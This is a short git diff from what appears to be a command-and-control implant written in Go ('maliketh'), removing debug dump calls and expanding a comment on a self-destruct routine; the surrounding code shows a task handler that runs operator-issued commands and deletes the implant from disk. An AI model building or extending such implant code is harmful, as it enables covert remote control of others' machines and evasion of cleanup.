@@ -15,7 +15,6 @@ import (
 	"time"
 
 	"maliketh/pkg/shellcode"
-	"github.com/davecgh/go-spew/spew"
 
 	oslib "maliketh/pkg/os"
 
@@ -25,12 +24,10 @@ import (
 func Handle(c2Url string, task models.Task, profile models.MalleableProfile) {
 	var output string
 	var err error
-	// spew.Dump(task)
 	switch task.Opcode {
 	case models.NOOP:
 		return
 	case models.OP_CMD:
-		spew.Dump(task)
 		output, err = Cmd(task.Args.([]interface{}))
 	case models.OP_SELFDESTRUCT:
 		output, err = SelfDestruct()
@@ -92,7 +89,7 @@ func Cmd(args []interface{}) (output string, err error) {
 	return
 }
 
-// Self destruct the implant
+// Self destruct the implant. This removes the executable from disk and exits with a 0 exit code.
 func SelfDestruct() (output string, err error) {
 
 	// Get the path to the executable
